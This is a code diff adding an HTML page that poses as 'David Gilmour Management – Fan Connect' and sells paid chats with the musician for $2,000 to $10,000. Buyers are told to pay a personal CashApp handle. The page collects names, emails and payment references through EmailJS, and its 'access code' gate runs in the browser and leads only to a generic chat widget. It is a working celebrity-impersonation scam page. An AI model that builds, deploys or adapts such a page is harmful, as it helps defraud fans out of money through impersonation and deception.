@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>David Gilmour Management - Fan Connect</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://images.unsplash.com/photo-1521737604893-d14cc237f11d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1500&q=80') no-repeat center center/cover;
+      margin: 0;
+      padding: 0;
+      color: white;
+      text-align: center;
+    }
+    header {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 20px;
+      font-size: 36px;
+      font-weight: bold;
+    }
+    section {
+      background: rgba(0, 0, 0, 0.6);
+      margin: 20px auto;
+      padding: 30px;
+      border-radius: 12px;
+      width: 80%;
+      max-width: 700px;
+      font-size: 20px;
+    }
+    h2 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-size: 20px;
+      text-align: left;
+    }
+    input, select, button, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      font-size: 18px;
+      border-radius: 6px;
+      border: none;
+    }
+    button {
+      background: green;
+      color: white;
+      cursor: pointer;
+      font-size: 20px;
+      margin-top: 20px;
+    }
+    #chatSection {
+      display: none;
+      margin-top: 20px;
+    }
+    textarea {
+      width: 100%;
+      height: 150px;
+      font-size: 18px;
+      padding: 10px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    David Gilmour Management – Fan Connect
+  </header>
+
+  <section>
+    <h2>Welcome Fans 💚</h2>
+    <p>David Gilmour’s management team deeply appreciates your love and support.  
+    To chat with David or the management team, please select your chat option and provide your details.</p>
+  </section>
+
+  <section>
+    <h2>Step 1: Select Chat Option</h2>
+    <select id="paymentOption">
+      <option value="">-- Select Chat Type --</option>
+      <option value="2000">15 Minutes Chat – $2,000</option>
+      <option value="3500">30 Minutes Chat – $3,500</option>
+      <option value="6000">1 Hour Chat – $6,000</option>
+      <option value="10000">Voice/Video Call – $10,000</option>
+    </select>
+    <button onclick="makePayment()">Make Payment</button>
+  </section>
+
+  <section>
+    <h2>Step 2: Submit Your Details</h2>
+    <form id="paymentForm">
+      <label for="name">Your Name:</label>
+      <input type="text" id="name" name="user_name" required>
+
+      <label for="email">Your Email:</label>
+      <input type="email" id="email" name="user_email" required>
+
+      <label for="reference">Payment Reference ID:</label>
+      <input type="text" id="reference" name="message" required placeholder="Enter your CashApp payment reference">
+
+      <button type="submit">Submit & Receive Access Code</button>
+    </form>
+  </section>
+
+  <section>
+    <h2>Step 3: Enter Your Access Code</h2>
+    <input type="text" id="accessCode" placeholder="Enter code here">
+    <button onclick="verifyCode()">Unlock Chat</button>
+  </section>
+
+  <section id="chatSection">
+    <h2>Live Chat</h2>
+    <textarea placeholder="Start chatting..."></textarea>
+  </section>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("uu8vvZMQLlVYT_YjA"); // Your public key
+    })();
+
+    let generatedCode = "";
+
+    function makePayment() {
+      let option = document.getElementById("paymentOption").value;
+      if(option) {
+        alert("Please send $" + option + " to CashApp: $KeilynFCarapia. After payment, submit your details.");
+        window.open("https://cash.app/$KeilynFCarapia", "_blank");
+      } else {
+        alert("Select a chat option first.");
+      }
+    }
+
+    document.getElementById("paymentForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+
+      let templateParams = {
+        user_name: document.getElementById("name").value,
+        user_email: document.getElementById("email").value,
+        message: document.getElementById("reference").value + " | Your Access Code: " + generatedCode
+      };
+
+      emailjs.send("service_offzcjp", "template_5bcdhpd", templateParams)
+        .then(function(response) {
+          alert("Details submitted! An access code has been sent to your email.");
+        }, function(error) {
+          alert("FAILED to send email. Try again. " + JSON.stringify(error));
+        });
+    });
+
+    function verifyCode() {
+      let code = document.getElementById("accessCode").value;
+      if(code === generatedCode) {
+        document.getElementById("chatSection").style.display = "block"; // existing
+        Tawk_API.showWidget(); // show Tawk.to chat
+        alert("Access code correct! Chat widget is now available in the bottom-right corner.");
+      } else {
+        alert("Invalid code.");
+      }
+    }
+  </script>
+
+  <!--Start of Tawk.to Script-->
+  <script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/68a0948fa4fc79192a7c8dc2/1j2pk8kgl';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+
+  // Hide widget initially
+  Tawk_API.onLoad = function(){
+      Tawk_API.hideWidget();
+  };
+  </script>
+  <!--End of Tawk.to Script-->
+</body>
+</html>
